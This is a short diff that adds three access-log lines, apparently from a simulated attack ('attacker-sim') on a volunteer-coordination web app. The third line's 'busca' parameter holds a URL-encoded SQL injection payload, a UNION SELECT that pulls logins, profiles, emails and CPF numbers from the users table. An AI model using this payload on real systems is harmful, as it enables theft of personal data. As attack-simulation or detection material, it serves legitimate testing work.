@@ -1,0 +1,3 @@
+127.0.0.1 - coord.voluntarios [04/Nov/2026:14:46:15] "POST /login? HTTP/1.1" 302 189 "-" "Mozilla/5.0 (attacker-sim)"
+127.0.0.1 - coord.voluntarios [04/Nov/2026:14:46:15] "GET /? HTTP/1.1" 200 187 "-" "Mozilla/5.0 (attacker-sim)"
+127.0.0.1 - coord.voluntarios [04/Nov/2026:14:46:15] "GET /historico?busca=zzz%25%27+UNION+SELECT+NULL%2Clogin%2Cperfil%2Cemail%2Ccpf%2CNULL+FROM+usuarios+--+ HTTP/1.1" 200 8114 "-" "Mozilla/5.0 (attacker-sim)"
